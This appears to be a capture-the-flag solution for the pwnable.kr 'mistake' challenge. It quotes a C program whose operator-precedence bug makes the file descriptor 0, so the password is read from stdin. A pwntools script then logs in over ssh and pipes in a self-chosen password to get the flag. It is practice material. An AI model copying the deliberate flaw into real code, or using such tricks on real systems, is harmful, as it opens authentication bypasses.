'''
Description:

    We all make mistakes, let's move on.
    (don't take this too seriously, no fancy hacking skill is required at all)

    This task is based on real event
    Thanks to dhmonkey

    hint : operator priority

    ssh mistake@pwnable.kr -p2222 (pw:guest)

Source of mistake.c:

    #include <stdio.h>
    #include <fcntl.h>

    #define PW_LEN 10
    #define XORKEY 1

    void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
            s[i] ^= XORKEY;
        }
    }
    
    int main(int argc, char* argv[]){
    
        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
            printf("can't open password %d\n", fd);
            return 0;
        }
        
        printf("do not bruteforce...\n");
        sleep(time(0)%20);
        
        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
            printf("read error\n");
            close(fd);
            return 0;       
        }
        
        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);
        
        // xor your input
        xor(pw_buf2, 10);
        
        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
            printf("Password OK\n");
            system("/bin/cat flag\n");
        }
        else{
            printf("Wrong Password\n");
        }
            
        close(fd);
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user   = 'mistake'
passwd = 'guest'
host   = 'pwnable.kr'
port   = 2222

part1   = 'TERMINATOR'
part2   = ''.join( chr(ord(s) ^ 1) for s in part1)
command = 'echo "{}{}" | ./mistake'.format(part1, part2)

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print flag
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
Mommy, the operator priority always confuses me :(
do not bruteforce...
input password : Password OK

[*] Closed connection to 'pwnable.kr'
'''
